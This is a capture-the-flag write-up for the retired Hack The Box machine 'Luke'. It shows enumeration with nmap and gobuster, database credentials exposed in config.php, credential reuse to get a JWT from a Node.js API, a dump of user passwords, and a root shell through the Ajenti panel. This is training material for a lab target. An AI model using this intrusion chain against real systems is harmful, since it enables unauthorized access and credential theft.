# Luke

This is the write-up for the box Luke that got retired at the 14th September 2019.
My IP address was 10.10.12.212 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.137    luke.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/luke.nmap 10.10.10.137
```

```markdown
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.12.212
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti
```

## Checking FTP (Port 21)

As anonymous login is allowed we will look what we can find on the FTP service.
```markdown
ftp 10.10.10.137
```

We find one directory with one file _webapp/for_Chihiro.txt_ that says:
```markdown
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry
```

So we eventually enumerated two usernames.

## Checking HTTP (Port 80)

There is nothing interesting on this website so we launch _gobuster_ to enumerate directories:
```markdown
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u hxxp://10.10.10.137/ -x php
```

This is the output we get:
```markdown
/login.php (Status: 200)
/member (Status: 301)
/management (Status: 401)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)
```

- _/member_ has nothing interesting
- _/management_ gives us a login prompt
- _/login.php_ gives us a login page
- _/config.php_ gives us a string that says:

```markdown
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

Now we got some credentials that we are going to test on every login page we found, but none of them work.

## Checking Node.js Express Framework (Port 3000)

This page displays only some JSON output and nothing else. Lets enumerate this webpage for directories, too:
```markdown
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u hxxp://10.10.10.137:3000/ -x php
```

This is the output we get:
```markdown
/login (Status: 200)
/users (Status: 200)
```

- /users just redirects us back
- /login says that we need to authenticate

As we got some credentials from before lets try to authenticate on this with _curl_:
```markdown
curl -XPOST hxxp://10.10.10.137:3000/login -d 'username=root&password=Zk6heYCyv6ZE9Xcg'
```

The response of the page is **Forbidden** so we now know that this gets accepted and we eventually need the correct username. 
When we try this with **admin** and the same password, we get a different response!
```markdown
curl -XPOST hxxp://10.10.10.137:3000/login -d 'username=admin&password=Zk6heYCyv6ZE9Xcg'
```

Response:
```json
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ"}
```

This is a JSON Web Token (JWT) that we can decipher to get more information.

### JSON Web Token

The values of the "token" are just Base64 decoded and can be read by decoding it.
The values are seperated by a _dot_ and should be decoded individually.

- eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  - This gives us information about the token like the algorithm that was used for signing
  - Decoded: {"alg":"HS256","typ":"JWT"}
  
- eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9
  - This is the data of the token
  - Decoded: {"username":"admin","iat":1568970749,"exp":1569057149}
  
- KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ
  - This is the signature of the token and can't be deciphered that easily but we don't need to anyway
  
Now lets use this token on the the Node.js framework page with _curl_:
```markdown
curl hxxp://10.10.10.137:3000/ -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ'
```

Response:
```json
{"message":"Welcome admin ! "}
```

After authenticating we should look into the _/users_ directory that we found earlier:
```markdown
curl -s hxxp://10.10.10.137:3000/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ' | jq
```

I am using **jq** so the JSON output is prettier and we get this:
```json
[                                                                                                                                                                                                        
  {                                                                                                 
    "ID": "1",                                                                                      
    "name": "Admin",                                                                                
    "Role": "Superuser"                                                                             
  },                                                                                                
  {                                                                                                                                                                                                      
    "ID": "2",                                                                                      
    "name": "Derry",                                                                                                                                                                                     
    "Role": "Web Admin"                                                                             
  },                                                                                                
  {                                                                                                 
    "ID": "3",                                                                                      
    "name": "Yuri",                                                                                 
    "Role": "Beta Tester"                                                                           
  },                                                                                                
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]
```

Now we get all users and can interact with them:
```markdown
curl -s hxxp://10.10.10.137:3000/users/Admin -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4OTcwNzQ5LCJleHAiOjE1NjkwNTcxNDl9.KYhdXTx04_hLWVM9ap83ktAdQ5YjAujQBa_sJkPMJBQ' | jq
```

Response:
```json
{
  "name": "Admin",
  "password": "WX5b7)>/rp$U)FW"
}
```

If we do this for all the users we get a password for all of them:
- Admin:WX5b7)>/rp$U)FW
- Derry:rZ86wwLvx7jUxtch
- Yuri:bet@tester87
- Dory:5y:!xa=ybfe)/QD

We will try all these credentials on every login prompt we got and find out that the credentials of _Derry_ works on the **/management** directory that we found on port 80.

### Log into /management on port 80

On this page we get an index for _login.php, config.php and config.json_. We know the PHP sites so we check the JSON file and see that these are configuration files for **Ajenti**. In those files we find a password:
> KpMasng6S5EtTy9Z

## Checking Ajenti (Port 8000)

The password we got works on Ajenti with the user _root_. Ajenti is an admin control panel where we can easily browse the file system or spawn a shell on the server.
We click on _Terminal_ and see that we are root and the box is done!
